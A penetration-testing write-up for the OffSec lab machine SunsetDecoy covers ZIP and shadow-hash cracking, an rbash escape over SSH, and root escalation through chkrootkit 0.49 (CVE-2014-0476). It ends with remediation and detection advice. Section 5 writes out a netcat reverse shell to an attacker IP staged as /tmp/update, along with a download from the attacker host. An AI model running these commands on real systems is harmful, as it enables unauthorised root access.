# SunsetDecoy - Offline Cracking & Environment Subversion

**Platform:** OffSec | **Target OS:** Linux | **Difficulty:** Fundamental
**Focus:** Information Disclosure, Offline Password Cracking (fcrackzip/john), Restricted Shell (rbash) Escape, Chkrootkit CVE-2014-0476 LPE.

## 1. Executive Summary & Attack Chain
This assessment highlights a critical attack chain demonstrating how minor information disclosure can lead to complete system compromise. The engagement began with an open directory listing on the web server, which exposed a password-protected ZIP archive. Through offline dictionary attacks, the archive was cracked, revealing a backup of the system's `/etc/shadow` file. 

Offline hash cracking yielded valid SSH credentials for a system user. Upon authentication, the environment was restricted via `rbash`, which was bypassed by forcing a clean pseudo-terminal allocation during the SSH handshake. Local process monitoring (`pspy64`) revealed a cron job executing an outdated and vulnerable version of `chkrootkit` (0.49). By exploiting a known arbitrary file execution flaw (CVE-2014-0476) within `chkrootkit`, a malicious payload was staged in `/tmp`, resulting in a reverse shell with root privileges.

**Kill-Chain summary:**
1. **Reconnaissance:** Nmap identified an exposed HTTP directory containing `save.zip`.
2. **Initial Access:** Cracked the ZIP file (`fcrackzip`) and the contained SHA-512 shadow hash (`john`) to obtain SSH credentials.
3. **Lateral Movement / Evasion:** Bypassed the Restricted Bash (`rbash`) environment using SSH pseudo-terminal manipulation to read the user flag.
4. **Privilege Escalation:** Monitored background processes with `pspy64` and exploited `chkrootkit 0.49` by staging an `update` script in `/tmp`, achieving root access.

---

## 2. Network Reconnaissance & Surface Mapping
The engagement commenced with an Nmap scan to map the exposed TCP services on the target.

```bash
❯ nmap -sV -sC 192.168.173.85
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-17 07:09 +0300
Nmap scan report for 192.168.173.85
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
|_http-title: Index of /
|_http-server-header: Apache/2.4.38 (Debian)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The Nmap output immediately highlighted a severe misconfiguration on the Apache web server (Port 80): **Directory Listing is enabled**. This allowed unauthenticated retrieval of a file named `save.zip`.

---

## 3. Initial Access & Offline Cryptanalysis
Attempting to extract `save.zip` revealed it was protected by PKZIP encryption. 

### OS Mechanics: Offline Dictionary Attacks
When a file or hash is extracted to the attacker's local machine, it is no longer bound by the target server's rate-limiting, lockout policies, or logging mechanisms. This permits high-speed offline dictionary attacks. `fcrackzip` was utilized to brute-force the PKZIP encryption key.

*Note: Initial execution contained a minor flag syntax error which was quickly corrected to `-D` (Dictionary mode).*

```bash
❯ unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password:
   skipping: etc/passwd              incorrect password
❯ fcrackzip -d -p ~/Work/htb/passwords.txt -u save.zip
fcrackzip: invalid option -- 'd'
unknown option

░▒▓ 💀 0xZiki   arch    
 󰅚 ❯ fcrackzip -D -p ~/Work/htb/passwords.txt -u save.zip

PASSWORD FOUND!!!!: pw == manuel

░▒▓ 💀 0xZiki   arch    
 󰄬 ❯ unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password:
  inflating: etc/passwd
  inflating: etc/shadow
```
The extracted archive contained backups of critical Linux configuration files, specifically `/etc/shadow`. This file contains the salted password hashes for system users. A unique user hash was identified:

```text
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
```
The `$6$` prefix denotes a SHA-512 crypt hash. John the Ripper (`john`) was deployed against this hash, successfully cracking the plaintext password.

```bash
❯ john --wordlist=~/Work/htb/passwords.txt hash.txt
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
server           (296640a3b825115a47b68fc44501c828)
```

---

## 4. Environment Evasion & Restricted Shell Escape
Authenticating via SSH with the cracked credentials (`296640a3b825115a47b68fc44501c828` / `server`) placed the session into a highly restricted environment. 

### OS Mechanics: Restricted Bash (`rbash`)
`rbash` is a restricted implementation of the Bourne Again SHell. It enforces security by restricting fundamental capabilities: it prevents the execution of commands containing a slash `/` (preventing absolute path execution), sets the `$PATH` environment variable as readonly, and disables directory changes (`cd`). 

Initial attempts to invoke commands or read files failed due to these strict environmental limits.

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt
-rbash: cat: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /usr/bin/cat user.txt
-rbash: /usr/bin/cat: restricted: cannot specify `/' in command names
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=$PATH:/usr/local/sbin:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-rbash: PATH: readonly variable
```

To bypass this, the SSH client was instructed to force pseudo-terminal allocation (`-t`) and execute a specific command (`bash --noprofile`) immediately upon connection. 
*Why this works:* By bypassing the remote user's `.bash_profile` and `.bashrc` execution during the login sequence, the standard Bash shell is spawned before the OS has the opportunity to apply the `rbash` restrictions and lock down the `$PATH`.

```bash
░▒▓ 💀 0xZiki   arch     ⏱ 7m38s
 󰅚 ❯ ssh 296640a3b825115a47b68fc44501c828@192.168.173.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.173.85's password:
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=$PATH:/usr/local/sbin:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat local.txt
401202c360525bf1960fa064860811cd
```

---

## 5. Privilege Escalation & Chkrootkit Mechanics (CVE-2014-0476)
During local enumeration, an interactive administrative binary named `honeypot.decoy` was discovered. Option 5 indicated the ability to "Launch an AV Scan". To understand the underlying OS behavior when this option is triggered, `pspy64` (an unprivileged Linux process snooper) was transferred to the host and executed.

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ wget http://192.168.45.228:8000/pspy64 pspy64
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x pspy64
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./pspy64
...
2026/09/17 00:58:01 CMD: UID=0     PID=12504  | /usr/sbin/CRON -f
2026/09/17 00:58:01 CMD: UID=0     PID=12510  | /bin/sh /root/chkrootkit-0.49/chkrootkit
```
The `pspy` output revealed that a cron job periodically executes `chkrootkit-0.49` as the `root` user (`UID=0`). 

### OS Theoretical Mechanics: CVE-2014-0476
`chkrootkit` is a shell script designed to check the system for known rootkits. Version 0.49 contains a critical vulnerability regarding how it handles variable assignment and file paths. Deep within the bash script, there is a routine that attempts to identify malicious files. It contains logic similar to this:
`file_port=$file_port $i`
Because the variable `$i` (which iterates over files in `/tmp`) is *not properly enclosed in quotes*, the Bash interpreter treats it as a command to be executed rather than a string assignment. If an attacker creates an executable file named `update` in the `/tmp` directory, when `chkrootkit` scans `/tmp` and processes the word "update", the bash interpreter dynamically evaluates and executes `/tmp/update`. Since `chkrootkit` runs as `root`, the `update` script also executes as `root`.

A malicious `update` file containing a netcat reverse shell was crafted and placed in `/tmp`. The "AV Scan" option within `honeypot.decoy` was then triggered to force the execution of `chkrootkit`.

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo "/usr/bin/nc -e /bin/sh 192.168.45.228 4444" >update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy
Option selected:5
The AV Scan will be launched in a minute or less.
```

The execution succeeded, routing a root-level shell back to the attacker infrastructure.

```bash
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.173.85 55238
ls
chkrootkit-0.49
proof.txt
root.txt
script.sh
cat proof.txt
c2df45dc8cb2459035ca4430536659ec
```

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies
1. **Web Server Hardening:** Disable Apache Directory Listing. This is typically done by removing the `Indexes` directive from the `Options` configuration block inside `apache2.conf` or the virtual host configuration file.
2. **Data Retention & Storage:** Never store sensitive backups, such as ZIP files containing `/etc/shadow`, in public-facing web directories.
3. **Software Patching:** Upgrade `chkrootkit` to version 0.50 or higher, where the missing bash string quotes have been properly implemented to prevent arbitrary code evaluation.
4. **Restricted Shell Enforcement:** To prevent the `-t "bash --noprofile"` bypass, ensure that SSH is explicitly configured to force the restricted shell command execution. Modify `sshd_config` to include `ForceCommand internal-sftp` or forcefully map the user to the `rbash` executable regardless of client-side PTY requests.

### Detection Engineering
* **File System Monitoring (Auditd):** Implement `auditd` rules to monitor the `/tmp` directory for the creation of executable files named `update` (e.g., `-w /tmp/update -p wa -k chkrootkit_exploit`).
* **Process Execution Anomalies (Event ID 4688 Equivalent):** Alert on instances where the `chkrootkit` process spawns child processes that initiate network sockets (`nc` or `bash -i`).
* **Web Log Analysis:** Monitor `access.log` for anomalous GET requests downloading `.zip` or `.bak` files from the web root directory.